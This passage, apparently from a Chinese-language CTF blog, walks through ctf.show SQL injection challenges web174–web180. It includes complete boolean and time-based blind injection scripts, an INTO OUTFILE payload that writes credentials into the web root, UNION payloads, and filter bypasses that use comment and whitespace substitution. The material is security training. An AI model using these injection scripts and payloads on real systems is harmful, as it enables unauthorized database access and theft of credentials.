class="number">0</span>,tablecount):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        tablelen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            tablelen_payload = <span class="string">f&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1))=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + tablelen_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                tablelen = l</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的长度为: <span class="subst">&#123;tablelen&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tablelen+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                table_name_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1),<span class="subst">&#123;m&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">                response = requests.get(url + table_name_payload, headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(table_name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的名字为: <span class="subst">&#123;table_name&#125;</span>&#x27;</span>)</span><br><span class="line">        tables.append(table_name)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#爆破字段的个数</span></span><br><span class="line"><span class="string">def brute_force_column_count(url, headers, tables):</span></span><br><span class="line"><span class="string">    column_count = 0</span></span><br><span class="line"><span class="string">    for l in range(1, 50):</span></span><br><span class="line"><span class="string">        column_countpayload = f&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;&#123;tables&#125;&#x27;)=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">        response = requests.get(url + column_countpayload, headers=headers)</span></span><br><span class="line"><span class="string">        if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">            column_count = l</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(f&#x27;表 &#123;tables&#125; 有 &#123;column_count&#125; 字段.&#x27;) </span></span><br><span class="line"><span class="string">    return column_count</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查询表中字段</span></span><br><span class="line"><span class="string">def brute_force_column_name(url, headers,tables, column_count):</span></span><br><span class="line"><span class="string">    columns = []</span></span><br><span class="line"><span class="string">    for c in range(column_count):</span></span><br><span class="line"><span class="string">        column_name = &#x27;&#x27;</span></span><br><span class="line"><span class="string">        for l in range(1, 50):</span></span><br><span class="line"><span class="string">            column_count_payload = f&quot;?id=1&#x27; and length((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1))=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">            response = requests.get(url + column_count_payload, headers=headers)</span></span><br><span class="line"><span class="string">            if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                column_count = l</span></span><br><span class="line"><span class="string">                print(f&#x27;表 &#123;tables&#125; 中字段 &#123;c+1&#125; 的个数为: &#123;column_count&#125;&#x27;)</span></span><br><span class="line"><span class="string">        for m in range(1, column_count+1):</span></span><br><span class="line"><span class="string">            for i in range(32, 128):</span></span><br><span class="line"><span class="string">                column_name_payload = f&quot;?id=1&#x27; and ascii(SUBSTR((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1),&#123;m&#125;,1))=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line"><span class="string">                response = requests.get(url + column_name_payload, headers=headers)</span></span><br><span class="line"><span class="string">                if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                    column_name += chr(i)</span></span><br><span class="line"><span class="string">                    print(column_name)</span></span><br><span class="line"><span class="string">                    break</span></span><br><span class="line"><span class="string">        print(f&#x27;表 &#123;tables&#125;  中字段 &#123;c+1&#125; 的名字为: &#123;column_name&#125;&#x27;)</span></span><br><span class="line"><span class="string">        columns.append(column_name)</span></span><br><span class="line"><span class="string">    return columns</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#查询表中数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_data</span>(<span class="params">url, headers,tables</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            data_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select password from <span class="subst">&#123;tables&#125;</span> where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + data_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                data += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://517733eb-2fdd-42a3-b505-c115fa0cd246.challenge.ctf.show//api/v4.php&#x27;</span></span><br><span class="line">    success_message = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    databaselen = brute_force_database_length(url, headers)</span><br><span class="line">    databasename = brute_force_database_name(url, headers, databaselen)</span><br><span class="line">    tablecount = brute_force_table_count(url, headers, databasename)</span><br><span class="line">    tables = brute_force_table_name(url, headers, tablecount, databasename)</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="comment">#column_count = brute_force_column_count(url, headers, table)   </span></span><br><span class="line">        <span class="comment">#columns = brute_force_column_name(url, headers,table, column_count)</span></span><br><span class="line">        data = brute_force_table_data(url, headers,table)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241207115218437.png" alt="image-20241207115218437"></p><p>运行得到flag，且脚本更改url即可使用(极为方便！)</p><hr><h3 id="法二-转码返回"><a href="#法二-转码返回" class="headerlink" title="法二:转码返回"></a>法二:转码返回</h3><p>用到replace函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">replace(str,a,b)   在str中将a替换成b</span><br></pre></td></tr></table></figure><p>直接写payload，注意，在语句中替换时不能替换为#和&amp;</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,(select REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>@<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>`<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>$<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span><span class="operator">%</span><span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span><span class="operator">^</span><span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span><span class="operator">~</span><span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="operator">*</span><span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>(<span class="string">&#x27; ),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>)<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span><span class="operator">=</span><span class="string">&#x27;) from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241207201549143.png" alt="image-20241207201549143"></p><p>直接转换后得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_string</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 定义数字到特殊符号的映射</span></span><br><span class="line">    mapping = &#123;</span><br><span class="line">        <span class="string">&#x27;@&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;^&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;~&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;*&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;9&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用列表推导式和映射来替换每个数字字符</span></span><br><span class="line">    decoded_chars = [mapping.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> input_string]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将字符列表连接成字符串</span></span><br><span class="line">    decoded_string = <span class="string">&#x27;&#x27;</span>.join(decoded_chars)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line">input_str = <span class="string">&quot;ctfshow&#123;aa$ea*ae-`c$@-^$c`-bbd@-~($=e~bc*^c@&#125;&quot;</span></span><br><span class="line">decoded_str = decode_string(input_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded string:&quot;</span>, decoded_str)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241207202203352.png" alt="image-20241207202203352"></p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>先看返回逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/[\x00-\x7f]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可判断返回时所以ASCII码中字符均被过滤，即无回显，用时间盲注来判断</p><p>[sql注入-盲注]: <a href="https://yxing-1.github.io/2024/12/06/sql%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">sql注入-盲注 | Yxing</a></p><hr><h3 id="法一-GET时间盲注脚本"><a href="#法一-GET时间盲注脚本" class="headerlink" title="法一:GET时间盲注脚本"></a>法一:GET时间盲注脚本</h3><p>还是使用蒙师傅脚本(蒙师傅真是太厉害了)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_data</span>(<span class="params">url</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,sleep(5),0)--+&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">5</span>:<span class="comment">#超时时间为5秒</span></span><br><span class="line">                data += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://7d3a021e-75e1-4d2f-b4f3-f7730ae28d82.challenge.ctf.show//api/v5.php&#x27;</span></span><br><span class="line">    flag = brute_force_table_data(url)</span><br></pre></td></tr></table></figure><p>运行结果(最后的flag为没等了)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241208214521946.png"></p><p>注：1.他写的休眠时间和判断时间为时间大于5秒，我改成2秒，第一个字符就错了，后面不知道还会不会错(已老实)，所以根据蒙师傅的经验，时间长一点好(后面又去请教了原因，和平时手工注入是一样的，平时都可能有网络延迟，所以说这也有可能，长一点可以减少误差)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241208204648009.png" alt="image-20241208204648009"></p><p>2.着重注意payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">           payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,sleep(5),0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>剖析一下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> password <span class="keyword">from</span> ctfshow_user5 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>子查询语句，更美观高效，但是要记住select</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(string,&#123;c<span class="operator">+</span><span class="number">0</span>&#125;,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>从字符串中查找子字符串，遍历整个flag，在string中c+0的位置开始每次读取一个</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> password <span class="keyword">from</span> ctfshow_user5 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),&#123;c<span class="operator">+</span><span class="number">0</span>&#125;,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;&#123;i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>将上面的字符通过ascii函数返回ascii值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((<span class="keyword">select</span> password <span class="keyword">from</span> ctfshow_user5 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),&#123;c<span class="operator">+</span><span class="number">0</span>&#125;,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;&#123;i&#125;&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>如果该字符ascii值符合i的值就休眠5秒，否则下一个</p><p>前面就是很正常的id闭合，后面–+注释</p><hr><h3 id="法二-读写文件"><a href="#法二-读写文件" class="headerlink" title="法二:读写文件"></a>法二:读写文件</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select username, password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag.txt<span class="string">&#x27; %23</span></span><br></pre></td></tr></table></figure><p>将username和password写入flag.txt，再去读取该文件</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241208213916183.png" alt="image-20241208213916183"></p><p>PS:这个还挺方便</p><hr><h1 id="过滤注入"><a href="#过滤注入" class="headerlink" title="过滤注入"></a>过滤注入</h1><h2 id="web176-过滤select"><a href="#web176-过滤select" class="headerlink" title="web176(过滤select)"></a>web176(过滤select)</h2><p>先判断列数为3</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209094647794.png" alt="image-20241209094647794"></p><p>回显时出错</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209094841732.png" alt="image-20241209094841732"></p><p>测试发现过滤select(双写好像绕不过，通过大小写绕过)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209095100972.png" alt="image-20241209095100972"></p><p>后面就可以进行正常的sql注入步骤</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union Select 1,(database()),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209095238804.png" alt="image-20241209095238804"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union Select 1,(Select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209095705145.png" alt="image-20241209095705145"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union Select 1,(Select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209100151954.png" alt="image-20241209100151954"></p><p>爆数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union Select 1,(Select password from ctfshow_user where username=&#x27;</span>flag<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209100527071.png" alt="image-20241209100527071"></p><h2 id="web177-过滤空格-注释符"><a href="#web177-过滤空格-注释符" class="headerlink" title="web177(过滤空格,注释符)"></a>web177(过滤空格,注释符)</h2><p>还是先判断过滤，当看到6时都是无数据就包是过滤了该语句的什么的</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209102415454.png" alt="image-20241209102415454"></p><p>当将–+替换为%23(#的url编码)时仍然无数据，考虑空格被过滤了，但是空格绕过后没想到也不行，那就是空格和注释符一起过滤了</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209103625662.png" alt="image-20241209103426376"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209103426376.png"></p><p>最终一起绕过后成功</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209103747214.png" alt="image-20241209103747214"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209103807128.png" alt="image-20241209103807128"></p><p>然后就又是一样的步骤</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,database()/**/,3%23</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209104814599.png" alt="image-20241209104814599"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209105058280.png" alt="image-20241209105058280"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#x27;</span>ctfshow_user<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209105234008.png" alt="image-20241209105234008"></p><p>爆数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password)from/**/ctfshow_user/**/where/**/username=&#x27;</span>flag<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209105825546.png" alt="image-20241209105825546"></p><p>**补充:**在看蒙师傅博客时还发现176,177另一种解法，直接通过万能密码绕过限制，直接就可以查询(由于176过滤select，所以该万能密码不用改格式),简单快捷高效</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/or/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><p>176(新开的一个环境，所以flag不一样了)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209110359934.png" alt="image-20241209110359934"></p><p>177亲测有效</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209110106559.png" alt="image-20241209110106559"></p><h2 id="web178-过滤空格"><a href="#web178-过滤空格" class="headerlink" title="web178(过滤空格,*)"></a>web178(过滤空格,*)</h2><p>这次学聪明了，先用万能密码试试水(直接用%23绕过注释符过滤了，其实测出来也确实有过滤)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209111207150.png" alt="image-20241209111207150"></p><p>再把空格用&#x2F;**&#x2F;替换，还是不行，推测可能是把&#x2F;**&#x2F;一起过滤了，用%0c(换页符),%09(制表符)绕过就行</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209112135837.png" alt="image-20241209112135837"></p><p>然后就直接出来了(万能密码好快。。。)，就可以交了，不过也可以自己多试试去慢慢注入</p><h2 id="web179-过滤空格-09"><a href="#web179-过滤空格-09" class="headerlink" title="web179(过滤空格,%09)"></a>web179(过滤空格,%09)</h2><p>测试过滤，还是先用万能密码试试水</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209113349118.png" alt="image-20241209113349118"></p><p>无数据，就说明里面又有什么被过滤了，这里我有个点就是第一个空格用%09，第二个空格用%0c，没数据就误以为不对(还以为%被过滤了)，后面看蒙师傅博客才知道就只过滤了%09，所以两个都用%0c绕过就行了</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209113705141.png" alt="image-20241209113705141"></p><p>PS:万能密码好！！！！！</p><h2 id="web180-过滤-23-空格"><a href="#web180-过滤-23-空格" class="headerlink" title="web180(过滤%23,空格)"></a>web180(过滤%23,空格)</h2><p>用万能密码进行空格绕过仍无数据，可能对注释符%23进行过滤，那现在就有绕过该过滤和闭合后引号两个办法</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211170635366.png" alt="image-20241211170635366"></p><hr><h3 id="法一-绕过-23过滤"><a href="#法一-绕过-23过滤" class="headerlink" title="法一:绕过%23过滤"></a>法一:绕过%23过滤</h3><p>将payload中%23改为–%0c,即可绕过过滤</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cor%0c1=1--%0c</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211171059447.png" alt="image-20241211171059447"></p><hr><h3 id="法二-闭合后引号"><a href="#法二-闭合后引号" class="headerlink" title="法二:闭合后引号"></a>法二:闭合后引号</h3><p>进行测试，有回显，表示可以成功闭合</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211171328547.png" alt="image-20241211171328547"></p><p>找回显</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211182344812.png" alt="image-20241211182344812"></p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cunion%0cselect%0c1,(database()),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211182853579.png" alt="image-20241211182853579"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span 